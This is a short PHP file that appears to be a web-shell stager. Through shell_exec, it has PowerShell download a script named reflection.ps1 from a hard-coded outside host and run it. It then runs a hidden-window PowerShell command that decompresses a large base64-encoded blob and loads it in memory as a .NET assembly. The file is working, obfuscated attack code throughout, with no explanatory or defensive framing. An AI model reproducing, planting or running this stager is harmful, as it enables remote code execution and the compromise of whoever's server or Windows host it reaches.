<?php
  function get_stager() {
    $init = "powershell.exe";
    $payload = "Invoke-WebRequest 10.50.103.142:8000/reflection.ps1 -outfile ref.ps1"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  }
  function execute_stager() {
  $init = "powershell.exe";
    $payload = ".\ref.ps1"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
 }
  function compile_stager() {
    $init = "powershell.exe -Sta -Nop -Window Hidden -Command";
    $payload = "sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(('7Vp7cFTndT/f3d27dxe06K6eIAl'+'WAsFKgEAvQBgwkhBoAYm'+'HJATENuyuLtLC7t7l3l1AZnCgbdI6GSchTdJx0iS1PZ0'+'8JnHG42Sch1vHzauNx9O0aTJJGzt20penaWM3DyedGvo7370r7SJhN/0n45nusuc7r+9855zvnG+/u2Lk5HvIQ0RefG7eJPo8Oa/d9Mavq/iEVn0xRJ8NPNv8eXHw2e'+'bxmZQdyVnmt'+'B'+'XPR'+'JLxbNbMRxJGxCpkI6lsZM+hsUjGnD'+'I6KiqCa1wbh4eIDgqFn'+'njX1xJFuy9QCy0Rm4naQSgOrysGEMHntOtdxJF53TnFUTrlzlFo99uIKuW/+XFucNYaJjr0ekFivaX/i1wseME/rYTUQA+X0B1541'+'Ie47Y2R7c01hITpzssI20mXR9OuzobyvV2Ew38X1zkV3XMGYelaR/9YCNy2UAknKXU39TeFiWKOUEl6sPk9pU27KhrEVvVZg8ddHUsMHO2H2qtVjNQE4kKrm21+krwiRI8U4I/NIebAcD2'+'hs0qf'+'T4g/dXtEBYLWk9Bpe4BjqG1dtWGD0eD0It'+'Cvn6'+'Jav0Usiuod6/1yu207oP/3taNdWvvQwjeG2oYRu2l7OxVlkSRlfVScam1U9zOhr/cRtW8DX+ZjQrrXuV2NrRyG9XzNrQyG1Ve67qHclFEH7QGvMCWAavyWXu9C7mqas36QKAHglfQNN'+'5SmvvJ1lnNb70N3CotGmZqTXjNjVosLWTOrQ9BJDNpssnaVUGzirUC1kfZUjXjwShsq1VLojVMLdWX'+'1pm1wPSl9WadHPWgWS8RczkPQXsFK1ZEuGlsZCNoNzIjFG1icajWXInRXMW8ZZgUYe6yWn3Zu1JmMzMr9Qq90mxhVNeXND7gkwn'+'VNT0QXQ3'+'mw6111q/'+'h3cOt9dLzh1uXw8oaznWrFK/QK12sQdcdLLqWrYUjL6Nko+uAqzfUZbwJUZ7WxkA6F5ZuRZ'+'dywFXVVdV2gLFqvbrObGd5dXQ9+75B4uZG1u1gxibOJTtTVeM3N/Nardv+EWuFW6OdTK2trVq37R1gaPo6s4uVX+P8dgPbs'+'EWv1tfaPUADRe'+'ESFbuyTHV3xap'+'SSzfJRFmp67dj/V'+'5QcwbLlQKLs80t7Pm6uuNV6/R1AXMrqDtTN2/eZB'+'d0r+7'+'XvZJnbmOwyHy5AWYf96y+tqrmec/a5znG7WBsr4Sd50Ph1hu1aMoG8w7wflB'+'bFd12TYYdvTXsbqxZ44YdvW3YeqAk5p65mKPzzrkagUV4TrRRRBv'+'Vo260lhNtze2jdSfLUHWfXhXdweKdTKl8IKq1Ureq1imZ2mgFeOYuydJr9SVSp3W5o1TXusJB6h'+'vkqNc7TbUcNb5c1rgs0OidnBLfc0+i1dBQdVL'+'J3O10VT8Py2v1'+'5cUGWaGH9BV15gDjDU5bNuqNbls2um3ZqDc4bdnotGWjOcit6PTmigeQeFHVFN3DoiZzyNGQrdhUqzcVV1oJN1cubMUA92CzWt6DjeU9'+'uHLxHlzlZG1VaaPVVrW5VdL2elXS9ptWSdsiVbKQ51RJG6qkTW97U1TJB3C4Y39L'+'q6RxQZW4Wxxxx2ZsW6R2RXQvi/RmF9ObpGE9UmZ/i7RfLBtZFM21enOxKFrgVcttiqL19YuiZfGiWO0kaXV5UbS7RdH+ekXR/psWRfsiRbGQ5xRFO4qiXW9/UxQF5+'+'oNiyK6j4W4IAZrP2jG5FC9oriBNdhA9TLfqLCDvJ3YvofN/dBa+/zaqvXRA2xsvXmQ7YQ'+'cfITxUbaJi3fweWrvdy+G30IJfQ/j'+'x2GOn0l4Cb7u/gXAqxi/AGbolvvm9YDzQUmwTPA9M6zIu6vuiR7mJLfxNm+a2+bucrKPyTuLZKXw'+'WINMHOEEh'+'R3COlAqni4VM2GZpeJ3loqZsP6wVPyZUjET1hOl4m+Xipmw/qFU/GqpmAnrZonYPkp88x4DDNrjgEtUc4JjbPBD6RhPa/DfyjInGRwHcCVtC5Xbbqu8daHy1tsqDy1UHrqt8thC5bHbKscXKscXKvvbVyqXcWP2trconisS2a9ET3DS7JNclBo/s2xXorijqx6v+Rbw+LGsarMi6w'+'vlpyue6F1gF/AFKoLqRs2l21Vnlnk3O4V1ZJvxWO2OqmOMbaHP+HlVrwsql/nKvWGNIjtIH'+'oBOa4a95j3sl+TLAyyoKpf5vn5qgxry1t7A4u0dfFdXr/LjQfteeTp4nEbe5aw1MLZ/QMgnOef58UJXx+aO3s1bu7aS7K404'+'M/h1+r78GgJ78'+'fRR6vH8lYqO22zxmfxUJADf/X'+'EGK2pd56bV++biOH7n3rqnX5dPZA2iw/uIMVkzcOBAE5P+i/RTbXOcyQ'+'O'+'FPkgyc/D8E/aQXQUcPIgH2kVJ7/yI9yxKCP6b8WJQqWHlLeqKj0t4QPK3biQf5TPP3rZn/OqdEphmKDXwPmUN+cN0mX1K5pKjxDDGR/DQZHzrqIlctYOX84bwnlz1h+i5doNv0oWLIfox74b4DzjYelVjfGsl'+'A4r34T0R16Gj/orEOgfEK94zfchWE76GP8jD6/7TTHpU2lcerJaY/53vAzPSPyilz35Y8HwPRL+iZ'+'/hcg/beYeUflXCjwCG6MPSH1Vh+G'+'1PRSBEvQHGHxcMd3'+'sZLvUzjEpNr69ZYEXBa/2LzEmtzMMHp'+'Ieflj68oP0n86V0r4/xT'+'QrDF+Wsn/m+jvP0Yxpnpt7H8'+'IiE65Szft6JL8n9EPJdSU/5nvLVSFwBVaXxngvy0++ISnoc21gD/lLygMLFQFIh8jRX0q8l5c'+'McQcNiUl'+'GpxfMWwC9'+'67gEc'+'0d6ibKEnKK7UQm4A9kqYAjzMhujt9RtQB4LukdQH6DlvRpmnfqjYikIzDqX9nf9JrPtlZx49ht1R6FvtjuaAchGa/yF/V3m79ozvmuKlX0r'+'q'+'mvZD3x5QNzfMr+ej8EbHyqNqp+KjNZL6Kl3Rdip+OrbRs'+'fmMd5PQ6B6XOqV9F/V+ZuO8lSDlJPW79'+'G56uxKkJyV1vb'+'5LtZV'+'QmWaI/tLVDN'+'InxTy'+'1C9SyOcoC'+'VSn3xO9n+G+ye16S+C+5NemvPcz5gsr41yRfSHhCct7tY+lJjXvvJ3zS0J9L6VdpHn4LMWxQBenEfi0HDFKnxO+XsE3CvwGsBEyJGnDe6W'+'mgF6lCu0gv0Tu1+1AHG9QHgb/q/yj2/2fiSUhz4sskxIDyddQNW4jTbvEM+B/xYEXR6fkuxei48gPSxe'+'+LFwErPP8K+CXtp4Avo'+'MOOYNZPqU3w3BPAf0Gd4lH0Xp94q8cjOsWvVE3oIqaGRL9'+'Y5a0WM'+'fGopwmWnvWvAf9vqV0ExIBnEzg/8veKI+Kod4eIC/bziHjVMyiu0T7/fvEQ3Rk4BHx9YAKw'+'OXCXOC/a/AmR'+'Esv9M6KaNLUgGmmT9nvAp733w9rPtHeLB2U2rtH7/O8X10VA+xCkd2gPiX7U5J/CzhHPJzHrvdpnxINiO6qefXgc/NOeLyOK93m+ADs3YUcX3yeOtw9RnKAh7SlwHtfaxSfEceUbgL9CBh4TL2nPiqdFvfh7wKfVH4m/Ejn1JfF98RXxsnhR3PC9Ks7Tx0QDnadLgvflWf9r4iW8K+kVcVOElBcp7q9'+'SXhHs8yvi4556pVruyCzd71+p/FpMe9coAeUnSgNO8iaxXrkmpdddyP1wTfbBJ4j75jHKYPebaT09o3TQEvogYBU9Ati'+'A'+'W91uWg3+I1L6FQlfkJAEw1XkVbYp+9GXAhXJ3'+'wPf81/H8GPf+8HzSp4fvSjwveKj95Ip7hPeq7dcD6nbW/6z6qjyshw9fLuc4zUoRLfq5byOHq/Fv4wqxCdGHb0Lvj/hKO3Y1Xf'+'qVO+pzbRj6JKRLO'+'SNsXx82rB2JVzuruSpU3tSdi4dnx1Mx23bYco5nYvO6aTYULaQMax4Im2c7qSDKTuPwZ3Tt'+'eicLtpbyCZPLybspuGR/sGx4f6u3i00beRPTYzv3cbWaMeIOVVIG7tomMZm7byR6YgdogmpEztGtjPsM7LwJG8AnYrn45Sxk6aVTiU4sOK0QTOdNpL5lJm1O6R+KkkHzfgU9U9NLaYzljOSqX'+'g6d'+'a8xRaPGxX2F1BTtGDTNcylj0Mzm4ymY2HXu1KmBePIc7iF7U0YatnI5IztFRw1kMmlILxFk8ty4xSR7i3AMOhyfmsIciQ+mcjOGJVFWHzFsG1m'+'hQcuYMrJ5eDAYT84YFMteMM8ZNJ90ivGGmbbE4ZFtYpy0UnnjIFyTtuC2xIfsZDxn0BiSDvnsYcvMm0kzPT7LzGLkFqzEc/k'+'CxhEjP2NODcRtg5w12GML8Hjv5r5Bw8qnzqSS'+'SDc7ycPYeP/4DNCp/jzuZIkCS8xMLpU2rOLOlIj2GInC9DS7fat6nDN/1EjHL0nMnpcfLSAVGYPVIEqk0ghjXuqW'+'Ew3M5p3Aj8XTBYMuSHg'+'2m01OF86mOnIXz3UYl5xdcDcA6UyaEpmwDQ7scCqbZXKvZWY4/i09zi2Txs0yco95MZtG8'+'bjkRK6E2Gfk2dRw3J6Zm3w8k57D59VcbKyQsB1sJJ5PzshkIBw2APyCkY1n5y'+'zShJUi7CJKLGPmjZLNQMypKZm3wXg6nUDR'+'yUjHDOuCYb2+Hqoza5'+'8xrczeVDaexj0ZvNK0of7zF03r3HxNuqbL68lpSl'+'STW1QYMhk'+'DkSX709MmNGcy1G8v5HFc89TReHbKzJ'+'DbB3OuUWzQms3lzXnGgImKj2eRtFTWqcwZxpISumV91DjjNjSNxjOGrIv5Jqd9llnIldCTRmIYZYx8zfOGLiWNnMSctohlz5jOxOIi6LHzhMUtOjrW73jJWU8lDWTmQgrmyNnpgUIqzZSNMwLDQOHMGZa5umYqmx+JZ/lIpLIDEquh/F2cc3zLKSQ341beuHEpL08DZ8qQZ'+'ZkW15x7gORB'+'OZkeLWQSc30Kbkf'+'SgXJwGnyPkZRRFWl0jUujbotZ2JOKT2dNO59K2ryOkyyb+g17bjOcJu4ong1u4LZ7IrgHItTRQDIam5LuCIN8Ws2ZKpZeh5PuaSuem5ntuOV4ktP4TLApIWHcwuNibL6KbSdzJTSnao9xJl5I5xfUvKO'+'Ng8JVKJW4eZ/zj7OP4psupOPW0KWchWLmA03al7Xjo'+'E6xYbqdwwGLAs0zNWanD5vpVHJWbppNhjPgyGI7vBaic0xxnmWf7EVHgHnGGQ4lzqJ6'+'kci0HByfEBCnlsZyOD3JyTAKfjCdQhQ4CS+kLDObYVz'+'WWMGy5n'+'ATO0duFZB7gMizh5IM8N3EAxyT43A+n4Pho8b'+'5gmHneRNKqHGTrwo0gnNtlP+wXJIw'+'nGnTxiXqt6z4rFz3gDErc87j6208ThXbyCTSsyTPrkEzN0tm7tTQ+UKcvyg'+'Yj2WNIjWfjjlrcjU06yVnPQe'+'LwWsHK6mKOR7Rqst0mVpoH24jMdoDbDs+l2kzXcGIh7C6F'+'jxVz1KODCm7jOe'+'PK8xvaKER8PJ4dijO6SqZE6Njc/zuIr+7hYYIZ'+'xuendhiHvOnpBUUJexMu2vwn'+'J7inKYW3JlG8JwyOCfrlbIreNOmGVjJw9Z22oR3J/zugJwh49'+'1y7IFn2'+'2kbaFxeDxyhSRqls3SSjtMAeAcR+TEq4Dmmi/roHPyYhIUs1j4GjVFKw98UrAxgRpfUxAWJduJN1+44iSVyeCfh3kUEcB'+'KJPEYZSmDcC+Mn8ajEqhuQxEmY3yLNX0K4J2gML'+'uHKCVf6MfMA9KdgKYHZR+kC8G6EjW9aOHAE4yic6MHMA5g3gHcSaRmAnZNYbwo6J+A6J2IKnrDdEb'+'oXOgU5npD2hyDnbRmS0oP'+'QG5BpnwQ/'+'Dcm'+'Qa6c'+'L9AV3nT2QD9N+0A'+'noTWAcBW9I2h2EP7MYz2Juz1wcE5i/FzGcQPL2w5+DWH8Cn1Ho9shx2k1ezUE3nwehegwiptOgnSSyyQzNIIm8'+'9EXsblImNQv5OELYijR1Qm8/xmFoZeD+WYyXkOzFLHNST8ikFmRQRxFmAsH0YY4hayFNhzGi'+'8zFnAtQQnUESeNcPY8UhuY0LLXfDEt'+'dIN7bpVst5WWWjcgsmZXrfaAW6+pkUhjhC64NbcYi64eAWjFMw2ifd7cYOcyV149ODRGzD8gnAPuj0QtOg'+'tcDisjl3us28FnvtNFqKT'+'CR'+'xJ+b1SpsbpdUEVtyIub1wyYBVA7w48ASwXrkeV+9GrNklt4R92wpKeIL'+'Yy84dxJ2YQUy7KEgR981cVpwq485L83CGi88gfjIygKXhXAS5MnFGpDGvGVqbyvRKrW9a1P4OuGeCN3ubVXNvsFpu0Xl8vkR'+'uOy/iprncu1I/HG+LOaIlZ+B3Wm4K1fAmdiLZfUhoJ5K9FRh5NpI4'+'cRxUFpW7DU/qe1D//XSIzmNOF7w8D3sxrHAWs+5Fwx5A/SVQ/wl40gvdIWikMRaw6jloGli7AAt8epEHp2HFIGabkKXYC88d+ODErbg8922AE9bTiU8Xke8uREgefHz8jUE+ef568PE7kVNDlO6kdWhvCzYL8G8zqA5qpzYSfud7Y6FOZ5lO16I6XWU63YvqdJfp9Cyq01Om07uoTu+8TkVpJFRR6nMp1VVGdZdRPWVUL75ut3+87ef/PPjcoUf+/bEXPnX67m+QNyKE5omQ8AHRdS'+'ZDQMOpEJihSf+GcHVNuEmEbgGhULg5FGryhcKt4bbwxiYfv8FcCknIocKtkueK9M4'+'avRfzNLzCf'+'WpENIWaPMsqhWBzK6kmPAvoCYqQWhM2lBB8UERjfV2lokiRcBRYtpJ'+'WCm8QKvznQahhQS8JJcR/YulkWtN8JLCkl/9vjcphXX3AGa5zkE'+'0+P2xr4avv90Hh6oMIOaRAgBm+CBgPaREPu6xp7CUQH'+'8k1IsSoQEAqM5oaVWKbn+YhfPUxzpwiLX6OF'+'8MgrX1Osv7MYT3tk8nTIsT'+'Jq'+'CKfzAksA42AhuOKjB1TvsYZCPEuaDCtMZCUIt1phH5IRsIeOut+Zyn5sMhzGn80PwF/Ec7C7/DVf3KGl9SI0tjY1Cj1f'+'6GSh7c'+'r4FfCO6VjyCMHimRyCex0HHkNvoevyaqA'+'izAgwiMhr1+EJ1hwJDzCgnDM4xeK9sS9dx1b3vPC/R41HFNURVFDwOr9xT1Fppp420SAFLeMEH'+'w4Fox4lcbwifDdetyjUcgbBU8T7n+oXMl/ZxhXaidxSx01s3NP'+'kuMzlnnRFppwf8jz8t+MtNj8b3otxf9DusirOlZK4W6OBwxDPgPLX70Mo2MqnZaym60U2b24k'+'Tfja7fzt8Gevt+2I/'+'//+m28/gc=')),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  }
  get_stager();
  execute_stager();
  compile_stager();
?>
